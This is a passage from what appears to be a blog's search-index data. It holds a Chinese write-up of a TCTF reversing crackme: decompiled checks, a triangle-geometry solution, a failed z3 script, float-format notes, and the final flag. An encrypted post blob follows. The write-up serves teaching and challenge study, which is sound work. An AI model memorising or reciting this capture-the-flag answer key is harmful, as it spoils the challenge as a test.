0.00001 &amp;&amp; v22 &gt; -0.00001 ) puts(&quot;Congratz, input is your flag&quot;); } return 0LL; } } } LABEL_31: result = 0xFFFFFFFFLL; } return result; } 这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。 分析可得到需要输入以下格式flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx} 这里通过-分割成三个部分，其中第一部分是已知的391bc2164f0a，后面就是程序验证逻辑 if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 ) break; v19 = v24 * v24 + v23 * v23 - v25 * v25; v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25; v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13; if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 ) { v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13; if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 ) puts(&quot;Congratz, input is your flag&quot;); } 当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式 $c&gt;b,b&gt;a,a+b&gt;c$ $p=\\frac{\\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$ $q=\\frac{abc}{(\\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$ $-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $ 但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3 from z3 import * x = Real(&#39;x&#39;) y = Real(&#39;y&#39;) z = Real(&#39;z&#39;) m = Real(&#39;m&#39;) n = Real(&#39;n&#39;) p = Real(&#39;p&#39;) q = Real(&#39;q&#39;) solver = Solver() m = x*x+y*y-z*z n = (4.0*x*x*y*y-m*m)**0.5*0.25 p = 2*n/(x+y+z) + (-1.940035480806554296875E13) q = x*y*z/(4.0*n) + (-4.777053952827391e13) solver.add(z &gt; y) solver.add(y &gt; x) solver.add(x + y &gt; z) solver.add(p &gt; -100,p&lt;100) solver.add(q &gt; -100,q&lt;100) solver.add(x == 6.2791383142154e13) if solver.check() == sat: print(solver.model()) else: print(&#39;unsolve&#39;) 结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因 下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式 $$Rr=\\frac{abc}{2(a+b+c)}$$ $$tan\\frac{C}{2} = \\frac{2r}{a+b-c} = \\frac{sinC}{1+cosC}$$ 这里$sinC,cosC,R,r,c$都是已知的 所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$ 得到对应的浮点数表示4064e4798769,56e0de138176 movq xmm0, rax punpckldq xmm0, xmmword ptr cs:qword_400BD0 subpd xmm0, cs:xmmword_400BE0 pshufd xmm1, xmm0, 4Eh addpd xmm1, xmm0 movlpd [rsp+r14*8+168h+var_148], xmm1 在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊 qword_400BD0=0x4530000043300000 xmmword_400BE0=0x45300000000000004330000000000000 punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分 然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。 所以其实这里的变换等于没有变换。 所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176 最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176} 补充：浮点数表示、运算、指令浮点数有单精度和双精度之分，float占4个字节，double占8个字节 在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^sM2^E$ e等于向左或向右移动到1为止的个数 比如：12.25 对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$ 下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位） 符号位0，指数3，尾数10001(第一位默认为1不需要表示) 由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数 其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示10000000+11-1=10000010 最后12.15单精度浮点数表示为：0 10000010 10001000000000000000000 十六进制：0x41440000 内存中小端表示：00 00 44 41 Float/Double 符号位 指数 尾数 示例 16进制 Float 1位 8位 23位 0 10000010 10001000000000000000000 41440000 Double 1位 11位 52位 0 10000000010 1000100000000000000000000000 000000000000000000000000 4028800000000000 特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。 在线转换http://www.binaryconvert.com/ 浮点数在进行加减运算的时候需要先对阶然后尾数部分运算 浮点数指令查询https://asm.inightmare.org/opcodelst/index.php 这里解释下pshufd xmm1, xmm0, 4Eh指令 pshufd可以按照指定的方式重新排列数据 这里4E二进制01 00 11 10 寄存器 值 xmm0 42cc8d80 00000000 41e842c9 e1400000 4E 01 00 11 10 xmm1 41e842c9 e1400000 42cc8d80 00000000","tags":[{"name":"tctf","slug":"tctf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"},{"name":"re","slug":"re","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"}]},{"title":"idapython learning note","date":"2019-03-07T11:42:24.000Z","path":"2019/03/07/idapython-learning-note/idapython-learning-note/","text":"Need password to decrypt! Incorrect Password! No content to display! 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